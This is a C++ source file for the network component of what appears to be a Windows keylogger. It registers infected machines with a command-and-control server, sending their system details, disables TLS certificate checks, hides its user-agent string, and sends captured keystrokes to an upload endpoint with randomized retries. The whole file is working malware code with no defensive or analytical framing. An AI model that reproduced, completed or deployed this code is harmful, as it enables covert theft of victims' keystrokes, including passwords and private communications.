#include "network.h"
#include "config.hpp" // Ensure this is config.hpp
#include "utils.h"
#include "globals.h"  // Include for global variables
#include "obfuscated_strings.h"
#include <windows.h>
#include <wininet.h>
#include <string>
#include <sstream>
#include <iostream>  // Added for std::cout

// Only define these if they're not already defined
#ifndef SECURITY_FLAG_IGNORE_CERT_CN_INVALID
#define SECURITY_FLAG_IGNORE_CERT_CN_INVALID    0x1000
#endif

#ifndef SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
#define SECURITY_FLAG_IGNORE_CERT_DATE_INVALID  0x2000
#endif

#ifndef SECURITY_FLAG_IGNORE_UNKNOWN_CA
#define SECURITY_FLAG_IGNORE_UNKNOWN_CA         0x100
#endif

#ifndef SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE
#define SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE   0x200
#endif

#ifndef INTERNET_SERVICE_HTTPS
#define INTERNET_SERVICE_HTTPS 3
#endif

using namespace std;

bool send_http_request(const std::string& endpoint,
    const std::string& method,
    const std::string& data,
    std::string* response) {
    HINTERNET hInternet = nullptr;
    HINTERNET hConnect = nullptr;
    HINTERNET hRequest = nullptr;
    BOOL bResult = FALSE;

    try {
        string user_agent = deobfuscate(reinterpret_cast<const unsigned char*>(obf_useragent)) + " Windows NT";
        
        if (g_debug_mode) {
            cout << "HTTP Request: " << method << " " << endpoint << endl;
            cout << "Target: " << c2_server << ":" << c2_port << endl;
            cout.flush();
        }
        
        hInternet = InternetOpenA(user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
        if (!hInternet) {
            if (g_debug_mode) {
                cout << "InternetOpenA failed: " << GetLastError() << endl;
                cout.flush();
            }
            return false;
        }

        // Force use of HTTPS
        DWORD service = INTERNET_SERVICE_HTTPS;
        
        hConnect = InternetConnectA(hInternet, c2_server.c_str(), c2_port,
                        NULL, NULL, service, 0, 0);
        if (!hConnect) {
            if (g_debug_mode) {
                cout << "InternetConnectA failed: " << GetLastError() << endl;
                cout.flush();
            }
            InternetCloseHandle(hInternet);
            return false;
        }

        // Flags for HTTPS with self-signed certificates
        DWORD flags = INTERNET_FLAG_RELOAD | 
                     INTERNET_FLAG_NO_CACHE_WRITE | 
                     INTERNET_FLAG_SECURE |
                     INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
                     INTERNET_FLAG_IGNORE_CERT_DATE_INVALID;
        
        hRequest = HttpOpenRequestA(hConnect, method.c_str(), endpoint.c_str(), NULL, NULL, NULL,
                        flags, 0);
        if (!hRequest) {
            if (g_debug_mode) {
                cout << "HttpOpenRequestA failed: " << GetLastError() << endl;
                cout.flush();
            }
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return false;
        }

        // Disable certificate validation
        DWORD securityFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                             SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                             SECURITY_FLAG_IGNORE_UNKNOWN_CA;
                             
        InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));

        string auth_header = "X-API-KEY: " + shared_secret + "\r\n";
        string client_header = "X-Client-ID: " + client_id + "\r\n";
        string headers = auth_header + client_header;

        if (g_debug_mode) {
            cout << "Sending request with headers: " << headers << endl;
            cout.flush();
        }

        if (method == "POST") {
            headers += "Content-Type: application/json\r\n";
            bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                            (LPVOID)data.c_str(), data.length());
            
            if (g_debug_mode && !bResult) {
                cout << "HttpSendRequestA (POST) failed: " << GetLastError() << endl;
                cout.flush();
            }
        } else {
            bResult = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), NULL, 0);
            
            if (g_debug_mode && !bResult) {
                cout << "HttpSendRequestA (GET) failed: " << GetLastError() << endl;
                cout.flush();
            }
        }

        if (bResult && response) {
            char buffer[4096] = {0};
            DWORD bytesRead = 0;
            response->clear();
            
            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                response->append(buffer, bytesRead);    
            }
            
            if (g_debug_mode) {
                cout << "Response received: " << *response << endl;
                cout.flush();
            }
        }

        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);

        return bResult;
    } catch (...) {
        if (g_debug_mode) {
            cout << "Exception in send_http_request" << endl;
            cout.flush();
        }
        
        if (hRequest) InternetCloseHandle(hRequest);
        if (hConnect) InternetCloseHandle(hConnect);
        if (hInternet) InternetCloseHandle(hInternet);
        return false;
    }
}

bool register_with_c2(const std::string& client_id_param) { // client_id is now a parameter
    if (registered) return true; // Already registered
    string sys_info = get_system_info();

    string os = "unknown", arch = "unknown";
    size_t os_pos = sys_info.find("OS:");
    size_t arch_pos = sys_info.find("ARCH:");

    if (os_pos != string::npos) {
        size_t end_pos = sys_info.find(";", os_pos);
        os = sys_info.substr(os_pos + 3, end_pos - os_pos - 3);
    }

    if (arch_pos != string::npos) {
        size_t end_pos = sys_info.find(";", arch_pos);
        if (end_pos == string::npos) end_pos = sys_info.length();
        arch = sys_info.substr(arch_pos + 5, end_pos - arch_pos - 5);
    }

    string json_data = "{\"id\":\"" + client_id_param + "\",\"os\":\"" + os + "\",\"arch\":\"" + arch + "\"}";

    string response;
    if (send_http_request("/register", "POST", json_data, &response)) {
        registered = true;
        return true;
    }
    return false;
}

bool exfiltrate_keylog_data(const string& data) {
    if (g_debug_mode) {
        cout << "==== EXFILTRATION STARTED ====" << endl;
        cout << "Data size: " << data.size() << " bytes" << endl;
        cout.flush();
    }
    
    for (int attempt = 0; attempt < exfiltration_retry_count; attempt++) {
        try {
            string endpoint = "/upload";
            string response;

            if (g_debug_mode) {
                cout << "Exfiltrating data, attempt " << (attempt + 1) << endl;
                cout.flush();
            }

            // Escape special characters in the data for JSON
            string escaped_data = data;
            // Replace backslashes first (otherwise you'd duplicate them)
            size_t pos = 0;
            while ((pos = escaped_data.find('\\', pos)) != string::npos) {
                escaped_data.replace(pos, 1, "\\\\");
                pos += 2;
            }
            
            // Replace other special characters
            pos = 0;
            while ((pos = escaped_data.find('\"', pos)) != string::npos) {
                escaped_data.replace(pos, 1, "\\\"");
                pos += 2;
            }
            
            pos = 0;
            while ((pos = escaped_data.find('\n', pos)) != string::npos) {
                escaped_data.replace(pos, 1, "\\n");
                pos += 2;
            }
            
            // Create JSON payload with client ID and data
            string json_data = "{\"id\":\"" + client_id + "\",\"data\":\"" + escaped_data + "\"}";
            
            if (g_debug_mode) {
                cout << "Sending to endpoint: " << endpoint << endl;
                cout << "Payload size: " << json_data.length() << " bytes" << endl;
                if (json_data.length() < 200) {
                    cout << "Payload: " << json_data << endl;
                } else {
                    cout << "Payload (truncated): " << json_data.substr(0, 200) << "..." << endl;
                }
                cout.flush();
            }
            
            // Use the send_http_request function with the proper endpoint and JSON data
            if (send_http_request(endpoint, "POST", json_data, &response)) {
                if (g_debug_mode) {
                    cout << "Data exfiltration successful, response: " << response << endl;
                    cout << "==== EXFILTRATION COMPLETED ====" << endl;
                    cout.flush();
                }
                return true;
            }
            
            if (g_debug_mode) {
                cout << "Exfiltration attempt failed, retrying..." << endl;
                cout.flush();
            }
            
            Sleep(get_random_sleep_interval(2)); // Variable retry delay
        } catch (...) {
            if (g_debug_mode) {
                cout << "Exception during exfiltration" << endl;
                cout.flush();
            }
            // Continue to next attempt
        }
    }
    
    if (g_debug_mode) {
        cout << "All exfiltration attempts failed" << endl;
        cout << "==== EXFILTRATION FAILED ====" << endl;
        cout.flush();
    }
    
    return false; // All attempts failed
}